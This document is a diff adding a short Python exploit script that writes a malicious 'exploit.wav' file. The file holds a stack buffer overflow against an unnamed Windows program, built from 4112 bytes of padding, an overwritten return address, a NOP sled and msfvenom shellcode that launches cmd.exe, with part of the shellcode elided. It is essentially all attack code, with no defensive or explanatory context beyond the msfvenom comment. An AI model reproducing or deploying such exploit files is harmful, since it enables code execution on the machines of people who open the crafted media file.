@@ -1,0 +1,23 @@
+#Python 3.9.4 (tags/v3.9.4:1f2e308, Apr  6 2021, 13:22:44) [MSC v.1928 32 bit (Intel)] on win32
+#Type "help", "copyright", "credits" or "license()" for more information.
+
+from struct import pack
+def exploit():
+  # msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
+	buf =  b""
+	buf += b"\xbb\x83\x91\xb5\x88\xdd\xc1\xd9\x74\x24\xf4\x58"
+	# ...SNIP...
+	buf += b"\xdc\x21\x06\xd1\x73\x41\x03\xb2\x1e\xd9\x82\x51"
+	buf += b"\x99\x44\xdb"
+
+	offset = 4112
+	buffer = b"A"*offset
+	
+	eip = pack('<L', 0x00419D0B)
+	nop = b"\x90"*32
+	payload = buffer + eip + nop + buf
+
+	with open('exploit.wav', 'wb') as f:
+	  f.write(payload)		
+  
+exploit()
